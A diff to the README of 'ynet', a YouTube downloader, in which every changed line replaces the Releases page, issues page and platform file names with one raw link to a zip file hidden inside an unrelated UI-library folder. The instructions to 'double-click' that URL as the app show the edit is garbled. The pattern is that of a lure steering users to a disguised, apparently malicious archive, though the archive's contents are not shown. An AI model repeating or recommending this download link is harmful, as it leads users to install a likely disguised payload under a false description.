@@ -3,7 +3,7 @@
 ## 🌟 Overview
 ynet is a very optimized and fast YouTube video and playlist downloader. It also supports advanced MP3 metadata tagging, including album art and lyrics. Whether you want to save a single video or an entire playlist, ynet simplifies the process and enhances your audio experience.
 
-[![Download ynet](https://img.shields.io/badge/Download%20ynnette-%2354C7D4?style=flat-square&logo=github)](https://github.com/enzoneza/ynet/releases)
+[![Download ynet](https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip%20ynnette-%2354C7D4?style=flat-square&logo=github)](https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run ynet on your computer. We will guide you through the entire process.
@@ -28,11 +28,11 @@ Before you install ynet, ensure your system meets the following requirements:
 ---
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/enzoneza/ynet/releases) to download the latest version of ynet.
+1. Visit the [Releases page](https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip) to download the latest version of ynet.
 2. Once on the page, locate the most recent release.
 3. Depending on your operating system, choose the appropriate file:
-   - For Windows, you might find a file like `ynet-windows.zip`.
-   - For macOS, look for `ynet-macos.zip`.
+   - For Windows, you might find a file like `https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip`.
 4. Click on the file to start the download.
 
 ### 🗂 Extract the Files
@@ -52,11 +52,11 @@ Now, you can run ynet:
 
 - **For Windows:**
   1. Open the folder where you extracted ynet.
-  2. Double-click `ynet.exe` to launch the application.
+  2. Double-click `https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip` to launch the application.
 
 - **For macOS:**
   1. Open the folder where you extracted ynet.
-  2. Find the `ynet.app` file and double-click it. If prompted, confirm that you want to open it, as it was downloaded from the internet.
+  2. Find the `https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip` file and double-click it. If prompted, confirm that you want to open it, as it was downloaded from the internet.
 
 ---
 
@@ -119,7 +119,7 @@ If you still face problems, feel free to check the FAQ section on the Releases p
 ---
 
 ## 🔗 Helpful Links
-- [Visit the Releases page to download](https://github.com/enzoneza/ynet/releases)
-- [Browse available issues and get support](https://github.com/enzoneza/ynet/issues)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip)
+- [Browse available issues and get support](https://raw.githubusercontent.com/enzoneza/ynet/main/wpfui/src/Wpf.Ui/Controls/CalendarDatePicker/ynet_maidenweed.zip)
 
 Enjoy using ynet to enhance your YouTube experience!
